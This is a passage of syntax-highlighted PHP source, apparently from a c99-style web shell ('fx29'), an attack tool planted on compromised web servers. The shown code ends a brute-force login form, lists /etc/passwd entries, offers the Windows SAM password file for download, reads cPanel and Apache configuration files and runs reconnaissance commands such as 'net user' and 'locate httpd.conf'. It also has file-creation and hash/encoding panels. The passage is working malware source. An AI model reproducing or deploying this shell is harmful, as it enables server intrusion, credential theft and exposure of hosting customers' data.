           <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Logging to e-mail:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_logemail</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$log_email</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logemail</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logemail</span><span class="p">)</span><span class="o">/</span><span class="mi">10</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td colspan=2&amp;gt;&amp;lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Brute</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">###[ SECURITY ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;security&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">&amp;lt;div class=barheader&amp;gt;.: Server Security Information :.&amp;lt;/div&amp;gt;</span>
<span class="x">&amp;lt;table class=&quot;contents&quot;&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Open Base Dir&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$hopenbasedir</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;Password File&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$nixpasswd</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$nixpasswd</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$nixpasswd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$nixpwd_s</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$nixpwd_s</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$nixpwd_e</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$nixpwd_e</span> <span class="o">=</span> <span class="nv">$nixpwdperpage</span><span class="p">;</span> <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">    *nix /etc/passwd:&amp;lt;br&amp;gt;</span>
<span class="x">    &amp;lt;form name=&quot;f_pwd&quot; action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;security&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;nixpasswd&quot; value=&quot;1&quot;&amp;gt;</span>
<span class="x">        &amp;lt;b&amp;gt;From:&amp;lt;/b&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;text&quot; name=&quot;nixpwd_s&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$nixpwd_s</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;b&amp;gt;To:&amp;lt;/b&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;text&quot; name=&quot;nixpwd_e&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="nv">$nixpwd_e</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;submit&quot; value=&quot;View&quot;&amp;gt;</span>
<span class="x">    &amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="cp">&lt;?php</span>
        <span class="nv">$i</span> <span class="o">=</span> <span class="nv">$nixpwd_s</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$nixpwd_e</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$uid</span> <span class="o">=</span> <span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$uid</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$uid</span><span class="p">[</span><span class="s2">&quot;dir&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$uid</span><span class="p">[</span><span class="s2">&quot;dir&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$uid</span><span class="p">[</span><span class="s2">&quot;dir&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span><span class="nv">$uid</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=security&amp;nixpasswd=1&amp;d=&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;View /etc/passwd&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;WINDIR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\repair\sam&#39;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=sam&amp;d=&quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;WINDIR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">repair&amp;ft=download</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;Download password file&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">    &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Config Files&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span>
      <span class="nv">$v</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
          <span class="k">array</span><span class="p">(</span><span class="s2">&quot;User Domains&quot;</span><span class="p">,</span><span class="s2">&quot;/etc/userdomains&quot;</span><span class="p">),</span>
          <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Cpanel Config&quot;</span><span class="p">,</span><span class="s2">&quot;/var/cpanel/accounting.log&quot;</span><span class="p">),</span>
          <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Apache Config&quot;</span><span class="p">,</span><span class="s2">&quot;/usr/local/apache/conf/httpd.conf&quot;</span><span class="p">),</span>
          <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Apache Config&quot;</span><span class="p">,</span><span class="s2">&quot;/etc/httpd.conf&quot;</span><span class="p">),</span>
          <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Syslog Config&quot;</span><span class="p">,</span><span class="s2">&quot;/etc/syslog.conf&quot;</span><span class="p">),</span>
          <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Message of The Day&quot;</span><span class="p">,</span><span class="s2">&quot;/etc/motd&quot;</span><span class="p">),</span>
          <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Hosts&quot;</span><span class="p">,</span><span class="s2">&quot;/etc/hosts&quot;</span><span class="p">)</span>
      <span class="p">);</span>
      <span class="nv">$sep</span> <span class="o">=</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nv">$windir</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;WINDIR&quot;</span><span class="p">];</span>
      <span class="nv">$etcdir</span> <span class="o">=</span> <span class="nv">$windir</span><span class="o">.</span><span class="s1">&#39;\system32\drivers\etc\\&#39;</span><span class="p">;</span>
      <span class="nv">$v</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
          <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Hosts&quot;</span><span class="p">,</span><span class="nv">$etcdir</span><span class="o">.</span><span class="s2">&quot;hosts&quot;</span><span class="p">),</span>
          <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Local Network Map&quot;</span><span class="p">,</span><span class="nv">$etcdir</span><span class="o">.</span><span class="s2">&quot;networks&quot;</span><span class="p">),</span>
          <span class="k">array</span><span class="p">(</span><span class="s2">&quot;LM Hosts&quot;</span><span class="p">,</span><span class="nv">$etcdir</span><span class="o">.</span><span class="s2">&quot;lmhosts.sam&quot;</span><span class="p">),</span>
      <span class="p">);</span>
      <span class="nv">$sep</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$v</span> <span class="k">as</span> <span class="nv">$sec_arr</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$sec_f</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">strrchr</span><span class="p">(</span><span class="nv">$sec_arr</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$sep</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
      <span class="nv">$sec_d</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nv">$sec_arr</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="nv">$sec_f</span><span class="p">);</span>
      <span class="nv">$sec_full</span> <span class="o">=</span> <span class="nv">$sec_d</span><span class="o">.</span><span class="nv">$sec_f</span><span class="p">;</span>
      <span class="nv">$sec_d</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nv">$sec_d</span><span class="p">,</span><span class="nv">$sep</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$sec_full</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">[ &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=</span><span class="si">$sec_f</span><span class="s2">&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sec_d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=txt</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$sec_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt; ]</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">    &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">function</span> <span class="nf">dispsecinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
            <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="o">.</span><span class="nb">wordwrap</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/pre&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
            <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;OS Version&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;cat /proc/version&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Kernel Version&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;sysctl -a | grep version&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Distrib Name&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;cat /etc/issue.net&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Distrib Name (2)&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;cat /etc/*-realise&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;CPU Info&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;cat /proc/cpuinfo&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;RAM&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;free -m&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;HDD Space&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;df -h&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;List of Attributes&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;lsattr -a&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Mount Options&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;cat /etc/fstab&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;lynx installed?&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;which lynx&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;links installed?&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;which links&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;GET installed?&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;which GET&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Where is Apache?&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;whereis apache&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Where is perl?&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;whereis perl&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Locate proftpd.conf&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;locate proftpd.conf&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Locate httpd.conf&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;locate httpd.conf&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Locate my.conf&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;locate my.conf&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Locate psybnc.conf&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;locate psybnc.conf&quot;</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;OS Version&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;ver&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;Account Settings&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;net accounts&quot;</span><span class="p">));</span>
      <span class="nx">dispsecinfo</span><span class="p">(</span><span class="s2">&quot;User Accounts&quot;</span><span class="p">,</span><span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;net user&quot;</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">###[ MAKE FILE ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;mkfile&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$mkfile</span> <span class="o">!=</span> <span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$overwrite</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;FILE EXIST:&amp;lt;/b&amp;gt; </span><span class="si">$overwrite</span><span class="s2"> &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">);</span> <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;ACCESS DENIED:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">);</span> <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;f&quot;</span><span class="p">;</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span>
                  <span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="nv">$f</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">);</span>
                <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Enter filename!&quot;</span><span class="p">);</span> <span class="p">}</span>
  <span class="p">}</span>
  <span class="c1">###[ ENCODER ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;encoder&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$encoder_input</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">&amp;lt;script language=&quot;javascript&quot;&amp;gt; function set_encoder_input(text) { document.forms.encoder.input.value = text; }&amp;lt;/script&amp;gt;</span>
<span class="x">&amp;lt;form name=&quot;encoder&quot; action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; method=POST&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;encoder&quot;&amp;gt;</span>
<span class="x">    &amp;lt;table class=&quot;contents&quot;&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;td colspan=&quot;4&quot; class=&quot;barheader&quot;&amp;gt;.: Encoder :.&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;td colspan=&quot;2&quot;&amp;gt;Input:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;textarea name=&quot;encoder_input&quot; id=&quot;input&quot; cols=&quot;70&quot; rows=&quot;5&quot;&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;submit&quot; value=&quot;Calculate&quot;&amp;gt;</span>
<span class="x">        &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;td rowspan=&quot;4&quot;&amp;gt;Hashes:&amp;lt;/td&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">foreach</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;md5&quot;</span><span class="p">,</span><span class="s2">&quot;crypt&quot;</span><span class="p">,</span><span class="s2">&quot;sha1&quot;</span><span class="p">,</span><span class="s2">&quot;crc32&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">        &amp;lt;td&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$v</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; size=&quot;50&quot; onFocus=&quot;this.select()&quot; onMouseover=&quot;this.select()&quot; onMouseout=&quot;this.select()&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$v</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; readonly&amp;gt;</span>
<span class="x">        &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">        &amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;td rowspan=2&amp;gt;Url:&amp;lt;/td&amp;gt;</span>
<span class="x">        &amp;lt;td&amp;gt;urlencode:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; size=&quot;35&quot; onFocus=&quot;this.select()&quot; onMouseover=&quot;this.select()&quot; onMouseout=&quot;this.select()&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; readonly&amp;gt;</span>
<span class="x">        &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;urldecode:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; size=&quot;35&quot; onFocus=&quot;this.select()&quot; onMouseover=&quot;this.select()&quot; onMouseout=&quot;this.select()&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">));</span> <span class="cp">?&gt;</span><span class="x">&quot; readonly&amp;gt;</span>
<span class="x">        &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;td rowspan=2&amp;gt;Base64:&amp;lt;/td&amp;gt;</span>
<span class="x">        &amp;lt;td&amp;gt;base64_encode:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; size=&quot;35&quot; onFocus=&quot;this.select()&quot; onMouseover=&quot;this.select()&quot; onMouseout=&quot;this.select()&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; readonly&amp;gt;</span>
<span class="x">        &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
